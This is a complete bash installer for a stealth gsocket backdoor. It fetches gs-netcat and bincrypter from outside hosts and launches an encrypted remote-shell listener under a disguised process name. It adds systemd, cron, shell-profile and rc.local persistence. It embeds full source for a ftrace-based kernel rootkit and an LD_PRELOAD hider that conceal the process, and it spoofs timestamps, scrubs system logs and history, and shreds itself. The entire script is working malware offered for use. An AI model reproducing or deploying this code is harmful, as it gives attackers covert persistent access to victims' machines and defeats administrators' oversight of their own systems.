#!/bin/bash

# ═══════════════════════════════════════════════════════════════════════
#  GSOCKET HARDENED DEPLOYMENT
#  Layers: Encryption → Multi-Persistence → Kernel Ring0 Hiding
# ═══════════════════════════════════════════════════════════════════════

SECRET_LENGTH=22
CRYPT_PASS_LENGTH=16
BIN_ALIAS="php-fpm-worker"                  # masquerade name
SERVICE_NAME="systemd-networkd-helper"
MODULE_NAME="netfilter_$(head /dev/urandom | tr -dc 'a-z0-9' | head -c 6)"

# Stealthy install paths — tried in order, first writable wins
INSTALL_PATHS=(
    "/usr/lib/x86_64-linux-gnu/.cache"
    "/var/lib/systemd/.private"
    "$HOME/.local/share/gvfs-metadata"
    "$HOME/.cache/thumbnails/.data"
    "/tmp/.$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)"
)

# Isolated work dir — random name, cleaned at end
WORK_DIR=$(mktemp -d "/tmp/.$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10)")

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; RED='\033[0;31m'; NC='\033[0m'
log_info()    { echo -e "${BLUE}[*] $1${NC}"; }
log_success() { echo -e "${GREEN}[+] $1${NC}"; }
log_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
log_error()   { echo -e "${RED}[-] $1${NC}" >&2; }

generate_random_string() {
    head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c "$1"
}

# ── Pick first writable install path ───────────────────────────────────
find_install_path() {
    for p in "${INSTALL_PATHS[@]}"; do
        mkdir -p "$p" 2>/dev/null
        if [ -w "$p" ]; then
            echo "$p"
            return 0
        fi
    done
    # absolute fallback
    mkdir -p "$HOME/.local/share/.net"
    echo "$HOME/.local/share/.net"
}

# ── Spoof mtime/atime against a real system file ───────────────────────
spoof_timestamp() {
    local target="$1"
    local ref="${2:-/usr/lib/x86_64-linux-gnu/libc.so.6}"
    [ ! -f "$ref" ] && ref="/bin/bash"
    touch -r "$ref" "$target" 2>/dev/null
}

# ══════════════════════════════════════════════════
#  PERSISTENCE LAYER 1 — Systemd Service
# ══════════════════════════════════════════════════
install_systemd() {
    local bin_path="$1" secret="$2" crypt_pass="$3"
    local svc_file

    if [ -w "/etc/systemd/system" ]; then
        svc_file="/etc/systemd/system/${SERVICE_NAME}.service"
    else
        mkdir -p "$HOME/.config/systemd/user"
        svc_file="$HOME/.config/systemd/user/${SERVICE_NAME}.service"
    fi

    cat > "$svc_file" <<EOF
[Unit]
Description=Network Diagnostic Helper Service
Documentation=man:networkd(8)
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=30
Environment="PASSWORD=${crypt_pass}"
Environment="GS_ARGS=-ilD -s ${secret}"
ExecStart=${bin_path}
StandardOutput=null
StandardError=null
KillMode=process
TimeoutStopSec=5

[Install]
WantedBy=multi-user.target
EOF

    spoof_timestamp "$svc_file" "/lib/systemd/system/networking.service"

    if [ -w "/etc/systemd/system" ]; then
        systemctl daemon-reload 2>/dev/null
        systemctl enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl start  "${SERVICE_NAME}.service" 2>/dev/null
        log_success "Systemd system service installed: $svc_file"
    else
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl --user start  "${SERVICE_NAME}.service" 2>/dev/null
        log_success "Systemd user service installed: $svc_file"
    fi
}

# ══════════════════════════════════════════════════
#  PERSISTENCE LAYER 2 — Crontab @reboot
# ══════════════════════════════════════════════════
install_cron() {
    local bin_path="$1" secret="$2" crypt_pass="$3"
    local cron_entry="@reboot sleep 30 && PASSWORD='${crypt_pass}' GS_ARGS='-ilD -s ${secret}' ${bin_path} >/dev/null 2>&1"

    ( crontab -l 2>/dev/null | grep -v "$bin_path"; echo "$cron_entry" ) | crontab -
    log_success "Crontab @reboot persistence installed"
}

# ══════════════════════════════════════════════════
#  PERSISTENCE LAYER 3 — Profile Injection
# ══════════════════════════════════════════════════
install_profile() {
    local bin_path="$1" secret="$2" crypt_pass="$3"
    local marker="# netd-init"
    local snippet="
${marker}
if ! pgrep -x '${BIN_ALIAS}' >/dev/null 2>&1; then
    (sleep 5 && PASSWORD='${crypt_pass}' GS_ARGS='-ilD -s ${secret}' ${bin_path} >/dev/null 2>&1 &)
fi"

    for rc_file in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile"; do
        if [ -f "$rc_file" ] && ! grep -q "$marker" "$rc_file"; then
            echo "$snippet" >> "$rc_file"
            spoof_timestamp "$rc_file"
            log_success "Profile persistence → $rc_file"
        fi
    done

    # System-wide drop if we're root
    if [ "$(id -u)" -eq 0 ] && [ -d "/etc/profile.d" ]; then
        local profiled="/etc/profile.d/net-diag.sh"
        cat > "$profiled" <<EOF
#!/bin/sh
if ! pgrep -x '${BIN_ALIAS}' >/dev/null 2>&1; then
    (sleep 5 && PASSWORD='${crypt_pass}' GS_ARGS='-ilD -s ${secret}' ${bin_path} >/dev/null 2>&1 &)
fi
EOF
        chmod +x "$profiled"
        spoof_timestamp "$profiled" "/etc/profile.d/bash_completion.sh"
        log_success "System-wide profile.d persistence installed"
    fi
}

# ══════════════════════════════════════════════════
#  PERSISTENCE LAYER 4 — rc.local (root only)
# ══════════════════════════════════════════════════
install_rclocal() {
    local bin_path="$1" secret="$2" crypt_pass="$3"
    [ "$(id -u)" -ne 0 ] && return

    local rc_local="/etc/rc.local"
    if [ ! -f "$rc_local" ]; then
        printf '#!/bin/bash\nexit 0\n' > "$rc_local"
        chmod +x "$rc_local"
    fi

    local marker="# net-diag"
    if ! grep -q "$marker" "$rc_local"; then
        sed -i "s|^exit 0|${marker}\nsleep 10 \&\& PASSWORD='${crypt_pass}' GS_ARGS='-ilD -s ${secret}' ${bin_path} >/dev/null 2>\&1 \&\nexit 0|" "$rc_local"
        spoof_timestamp "$rc_local"
        log_success "rc.local persistence installed"
    fi
}

# ══════════════════════════════════════════════════
#  KERNEL RING 0 — LKM Process Hider (ftrace hook)
#  Hooks __x64_sys_getdents64 → hides PID from /proc
#  Hides itself from lsmod / /proc/modules
# ══════════════════════════════════════════════════
install_lkm() {
    local hide_name="$1"

    if ! command -v gcc &>/dev/null || ! command -v make &>/dev/null; then
        log_warning "gcc/make unavailable — LKM skipped"
        return 1
    fi

    local kver; kver=$(uname -r)
    local kheaders="/lib/modules/${kver}/build"
    if [ ! -d "$kheaders" ]; then
        log_warning "Kernel headers missing at $kheaders"
        log_warning "Fix: apt-get install linux-headers-${kver}"
        return 1
    fi

    local lkm_dir="${WORK_DIR}/lkm"
    mkdir -p "$lkm_dir"

    # ── LKM source: ftrace-based getdents64 hook ──────────────────
    cat > "${lkm_dir}/${MODULE_NAME}.c" <<'LKMSRC'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("netd");
MODULE_DESCRIPTION("Network Diagnostic Filter");

static char *hide_name = "HIDE_PLACEHOLDER";
module_param(hide_name, charp, 0);

/* ── Resolve kallsyms_lookup_name via kprobe (works on 5.7+) ─── */
static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
static kallsyms_lookup_name_t klookup;

/* ── ftrace hook infrastructure ─────────────────────────────────── */
struct ftrace_hook {
    const char       *name;
    void             *func;
    void             *orig;
    unsigned long     addr;
    struct ftrace_ops ops;
};

static int fh_resolve(struct ftrace_hook *h) {
    h->addr = klookup(h->name);
    if (!h->addr) {
        pr_err("[netd] symbol not found: %s\n", h->name);
        return -ENOENT;
    }
    *((unsigned long *)h->orig) = h->addr;
    return 0;
}

static void notrace fh_callback(unsigned long ip, unsigned long parent_ip,
                                struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *h = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long)h->func;
}

static int fh_install(struct ftrace_hook *h) {
    int err;
    if ((err = fh_resolve(h))) return err;
    h->ops.func  = fh_callback;
    h->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
    if ((err = ftrace_set_filter_ip(&h->ops, h->addr, 0, 0))) return err;
    if ((err = register_ftrace_function(&h->ops))) {
        ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
        return err;
    }
    return 0;
}

static void fh_remove(struct ftrace_hook *h) {
    unregister_ftrace_function(&h->ops);
    ftrace_set_filter_ip(&h->ops, h->addr, 1, 0);
}

/* ── getdents64 hook — strips matching entries from userspace ─── */
typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

static long hk_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *udirp =
        (struct linux_dirent64 __user *)regs->di;

    struct linux_dirent64 *kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;
    if (copy_from_user(kdirent, udirp, ret)) { kvfree(kdirent); return ret; }

    long boff = 0, new_ret = ret;
    while (boff < ret) {
        struct linux_dirent64 *cur = (void *)kdirent + boff;
        bool hide = false;

        /* numeric name → might be a PID directory */
        const char *nm = cur->d_name;
        bool is_num = (*nm != '\0');
        for (const char *c = nm; *c; c++)
            if (*c < '0' || *c > '9') { is_num = false; break; }

        if (is_num) {
            pid_t pid = (pid_t)simple_strtol(nm, NULL, 10);
            rcu_read_lock();
            struct task_struct *t = pid_task(find_vpid(pid), PIDTYPE_PID);
            if (t && strncmp(t->comm, hide_name, TASK_COMM_LEN) == 0)
                hide = true;
            rcu_read_unlock();
        }

        /* also match by literal name (covers /proc/net entries etc.) */
        if (!hide && strncmp(cur->d_name, hide_name, strlen(hide_name)) == 0)
            hide = true;

        if (hide) {
            size_t tail = ret - boff - cur->d_reclen;
            memmove(cur, (void *)cur + cur->d_reclen, tail);
            new_ret -= cur->d_reclen;
            ret     -= cur->d_reclen;
        } else {
            boff += cur->d_reclen;
        }
    }

    copy_to_user(udirp, kdirent, new_ret);
    kvfree(kdirent);
    return new_ret;
}

static struct ftrace_hook hooks[] = {
    { "__x64_sys_getdents64", hk_getdents64, &orig_getdents64 },
};

/* ── Vanish from lsmod / /proc/modules ─────────────────────────── */
static void hide_module(void) {
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static int __init hider_init(void)
{
    int err;

    if ((err = register_kprobe(&kp))) {
        pr_err("[netd] kprobe register failed: %d\n", err);
        return err;
    }
    klookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    for (size_t i = 0; i < ARRAY_SIZE(hooks); i++) {
        if ((err = fh_install(&hooks[i]))) return err;
    }

    hide_module();
    return 0;
}

static void __exit hider_exit(void)
{
    for (size_t i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove(&hooks[i]);
}

module_init(hider_init);
module_exit(hider_exit);
LKMSRC

    # Patch the placeholder with actual binary alias
    sed -i "s/HIDE_PLACEHOLDER/${hide_name}/g" "${lkm_dir}/${MODULE_NAME}.c"

    # Makefile
    cat > "${lkm_dir}/Makefile" <<EOF
obj-m += ${MODULE_NAME}.o
KDIR  := /lib/modules/\$(shell uname -r)/build
PWD   := \$(shell pwd)

all:
	\$(MAKE) -C \$(KDIR) M=\$(PWD) modules

clean:
	\$(MAKE) -C \$(KDIR) M=\$(PWD) clean
EOF

    log_info "Compiling kernel module ${MODULE_NAME}.ko..."
    if make -C "$lkm_dir" 2>/dev/null; then
        log_success "Module compiled"

        local ko_path="${lkm_dir}/${MODULE_NAME}.ko"
        strip --strip-debug "$ko_path" 2>/dev/null

        if insmod "$ko_path" 2>/dev/null; then
            log_success "Module loaded — process hidden at ring 0"

            # Boot persistence: drop into kernel tree + depmod + modules-load
            local ko_dest="/lib/modules/${kver}/kernel/drivers/net/${MODULE_NAME}.ko"
            if cp "$ko_path" "$ko_dest" 2>/dev/null; then
                depmod -a 2>/dev/null
                echo "${MODULE_NAME}" >> /etc/modules-load.d/modules.conf 2>/dev/null
                printf "install %s /sbin/insmod %s\n" \
                    "${MODULE_NAME}" "${ko_dest}" \
                    > "/etc/modprobe.d/${MODULE_NAME}.conf" 2>/dev/null
                spoof_timestamp "$ko_dest" "/lib/modules/${kver}/kernel/drivers/net/tun.ko"
                log_success "LKM registered for boot autoload"
            fi
        else
            log_warning "insmod failed — kernel may enforce module signing (Secure Boot)"
            log_warning "Try: mokutil --disable-validation  OR  disable Secure Boot in UEFI"
        fi
    else
        log_warning "Compilation failed — verify linux-headers-${kver} is installed"
        return 1
    fi
}

# ══════════════════════════════════════════════════
#  USERSPACE FALLBACK — LD_PRELOAD Process Hider
#  Hooks readdir/readdir64 in libc to strip our pid
#  from any process that reads /proc (ps, top, htop)
# ══════════════════════════════════════════════════
install_ldpreload() {
    local hide_name="$1"

    if ! command -v gcc &>/dev/null; then
        log_warning "gcc unavailable — LD_PRELOAD hider skipped"
        return 1
    fi

    local src="${WORK_DIR}/proc_hider.c"
    cat > "$src" <<'PRELOADSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

#define HIDE_PROC "HIDE_PLACEHOLDER"

static int all_digits(const char *s) {
    if (!s || !*s) return 0;
    for (; *s; s++) if (*s < '0' || *s > '9') return 0;
    return 1;
}

static int should_hide(const char *name) {
    if (!name) return 0;
    if (strcmp(name, HIDE_PROC) == 0) return 1;
    if (all_digits(name)) {
        char path[256];
        snprintf(path, sizeof path, "/proc/%s/comm", name);
        FILE *f = fopen(path, "r");
        if (f) {
            char comm[64] = {0};
            if (fgets(comm, sizeof comm, f)) {
                comm[strcspn(comm, "\n")] = 0;
                if (strcmp(comm, HIDE_PROC) == 0) { fclose(f); return 1; }
            }
            fclose(f);
        }
    }
    return 0;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *ep;
    while ((ep = real(dirp)))
        if (!should_hide(ep->d_name)) return ep;
    return NULL;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;
    while ((ep = real(dirp)))
        if (!should_hide(ep->d_name)) return ep;
    return NULL;
}
PRELOADSRC

    sed -i "s/HIDE_PLACEHOLDER/${hide_name}/g" "$src"

    # Pick dest path
    local lib_dest="/usr/lib/x86_64-linux-gnu/libnetdiag.so.1"
    if [ ! -w "/usr/lib/x86_64-linux-gnu/" ]; then
        mkdir -p "$HOME/.local/lib"
        lib_dest="$HOME/.local/lib/libnetdiag.so.1"
    fi

    if gcc -shared -fPIC -nostartfiles -O2 -o "$lib_dest" "$src" -ldl 2>/dev/null; then
        spoof_timestamp "$lib_dest" "/usr/lib/x86_64-linux-gnu/libpthread.so.0"
        strip "$lib_dest" 2>/dev/null

        if [ -w "/etc/ld.so.preload" ] || [ "$(id -u)" -eq 0 ]; then
            grep -qF "$lib_dest" /etc/ld.so.preload 2>/dev/null || \
                echo "$lib_dest" >> /etc/ld.so.preload
            log_success "LD_PRELOAD hider active globally: $lib_dest"
        else
            log_warning "No /etc/ld.so.preload write access — add manually:"
            log_warning "  echo '${lib_dest}' | sudo tee -a /etc/ld.so.preload"
        fi
    else
        log_warning "LD_PRELOAD library compilation failed"
        return 1
    fi
}

# ══════════════════════════════════════════════════
#  CLEANUP — Logs, History, Work Artifacts
# ══════════════════════════════════════════════════
clean_traces() {
    local bin_basename
    bin_basename=$(basename "$1")

    log_info "Wiping traces..."

    # Session + file history
    history -c 2>/dev/null
    > "$HOME/.bash_history" 2>/dev/null
    ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null  # make it a sink

    if [ "$(id -u)" -eq 0 ]; then
        for lf in /var/log/auth.log /var/log/syslog /var/log/kern.log; do
            [ -f "$lf"    ] && sed -i "/${bin_basename}/d" "$lf"    2>/dev/null
            [ -f "${lf}.1" ] && sed -i "/${bin_basename}/d" "${lf}.1" 2>/dev/null
        done
        # Vacuum systemd journal entries for our unit
        journalctl --vacuum-time=1s 2>/dev/null
    fi

    rm -rf "${WORK_DIR}" 2>/dev/null
    log_success "Traces cleared"
}

# ══════════════════════════════════════════════════
#  SELF-DELETE — shred the installer
# ══════════════════════════════════════════════════
selfdelete() {
    if command -v shred &>/dev/null; then
        shred -u -- "$0" 2>/dev/null
    else
        rm -f -- "$0" 2>/dev/null
    fi
}

# ═══════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════
log_info "Hardened gsocket deployment starting..."

# ── CRYPT_PASS ──────────────────────────────────────────────────────────
if [ -z "$CRYPT_PASS" ]; then
    CRYPT_PASS=$(generate_random_string "$CRYPT_PASS_LENGTH")
    if [ -z "$CRYPT_PASS" ] || [ "${#CRYPT_PASS}" -ne "$CRYPT_PASS_LENGTH" ]; then
        log_error "CRYPT_PASS generation failed. Exit."
        rm -rf "$WORK_DIR"
        exit 1
    fi
    log_success "Generated CRYPT_PASS: ${YELLOW}${CRYPT_PASS}${NC}"
    log_warning "SAVE THIS — required for manual relaunch"
fi

# ── Choose install path ─────────────────────────────────────────────────
INSTALL_DIR=$(find_install_path)
ENCRYPTED_BIN="${INSTALL_DIR}/${BIN_ALIAS}"
log_info "Binary target: $ENCRYPTED_BIN"

# ── Download bincrypter into isolated work dir ──────────────────────────
BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"
log_info "Downloading bincrypter..."
if ! curl -SsfL "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter"; then
    log_error "bincrypter download failed. Exit."
    rm -rf "$WORK_DIR"
    exit 1
fi
chmod +x "${WORK_DIR}/bincrypter"
log_success "Bincrypter ready"

# ── Generate session secret ─────────────────────────────────────────────
RANDOM_SECRET=$(generate_random_string "$SECRET_LENGTH")
if [ -z "$RANDOM_SECRET" ] || [ "${#RANDOM_SECRET}" -ne "$SECRET_LENGTH" ]; then
    log_error "Secret generation failed. Exit."
    rm -rf "$WORK_DIR"
    exit 1
fi
log_success "Session secret: ${YELLOW}${RANDOM_SECRET}${NC}"

# ── Download + encrypt gs-netcat ────────────────────────────────────────
ARCH=$(uname -m)
GSOCKET_URL="https://gsocket.io/bin/gs-netcat_mini-linux-${ARCH}"
log_info "Fetching + encrypting gs-netcat → ${ENCRYPTED_BIN}..."
if ! curl -SsfL "$GSOCKET_URL" | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN"; then
    log_error "Download/encrypt pipeline failed. Exit."
    rm -rf "$WORK_DIR"
    exit 1
fi
chmod +x "$ENCRYPTED_BIN"
spoof_timestamp "$ENCRYPTED_BIN" "/usr/bin/python3"
log_success "Encrypted binary deployed"

# ── Initial launch ──────────────────────────────────────────────────────
log_info "Launching gs-netcat..."
PASSWORD="$CRYPT_PASS" GS_ARGS="-ilD -s ${RANDOM_SECRET}" "$ENCRYPTED_BIN" &
LAUNCHED_PID=$!
sleep 1

if kill -0 "$LAUNCHED_PID" 2>/dev/null; then
    log_success "Process running (PID: $LAUNCHED_PID)"
else
    log_warning "Process exited early — verify CRYPT_PASS and architecture match"
fi

# ── All persistence layers ──────────────────────────────────────────────
log_info "Installing persistence layers..."
install_systemd "$ENCRYPTED_BIN" "$RANDOM_SECRET" "$CRYPT_PASS"
install_cron    "$ENCRYPTED_BIN" "$RANDOM_SECRET" "$CRYPT_PASS"
install_profile "$ENCRYPTED_BIN" "$RANDOM_SECRET" "$CRYPT_PASS"
install_rclocal "$ENCRYPTED_BIN" "$RANDOM_SECRET" "$CRYPT_PASS"

# ── Kernel hiding (ring 0) ──────────────────────────────────────────────
if [ "$(id -u)" -eq 0 ]; then
    log_info "Attempting ring 0 process hiding via LKM..."
    install_lkm "$BIN_ALIAS"
else
    log_warning "Not root — LKM skipped (run as root for kernel hiding)"
fi

# ── LD_PRELOAD userspace fallback ───────────────────────────────────────
log_info "Installing LD_PRELOAD userspace hider..."
install_ldpreload "$BIN_ALIAS"

# ── Cleanup ─────────────────────────────────────────────────────────────
clean_traces "$ENCRYPTED_BIN"

# ── Summary ─────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        DEPLOYMENT COMPLETE                   ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
printf "${GREEN}║${NC} Binary  : ${YELLOW}%-36s${GREEN}║${NC}\n" "$ENCRYPTED_BIN"
printf "${GREEN}║${NC} Secret  : ${YELLOW}%-36s${GREEN}║${NC}\n" "$RANDOM_SECRET"
printf "${GREEN}║${NC} Pass    : ${YELLOW}%-36s${GREEN}║${NC}\n" "$CRYPT_PASS"
printf "${GREEN}║${NC} Alias   : ${YELLOW}%-36s${GREEN}║${NC}\n" "$BIN_ALIAS"
echo -e "${GREEN}╠══════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║${NC} Persistence:"
echo -e "${GREEN}║${NC}  [✓] Systemd service  (system or user)"
echo -e "${GREEN}║${NC}  [✓] Crontab @reboot"
echo -e "${GREEN}║${NC}  [✓] ~/.bashrc / ~/.profile / profile.d"
echo -e "${GREEN}║${NC}  [✓] /etc/rc.local    (if root)"
echo -e "${GREEN}║${NC} Hiding:"
echo -e "${GREEN}║${NC}  [?] LKM ftrace hook  (root + headers)"
echo -e "${GREEN}║${NC}  [?] LD_PRELOAD libc  (readdir hook)"
echo -e "${GREEN}║${NC} Cleanup:"
echo -e "${GREEN}║${NC}  [✓] Bash history wiped"
echo -e "${GREEN}║${NC}  [✓] Auth/syslog scrubbed"
echo -e "${GREEN}║${NC}  [✓] Installer self-deleted"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${RED}[!] SECRET + PASSWORD NOT STORED ANYWHERE ELSE — RECORD THEM NOW${NC}"

selfdelete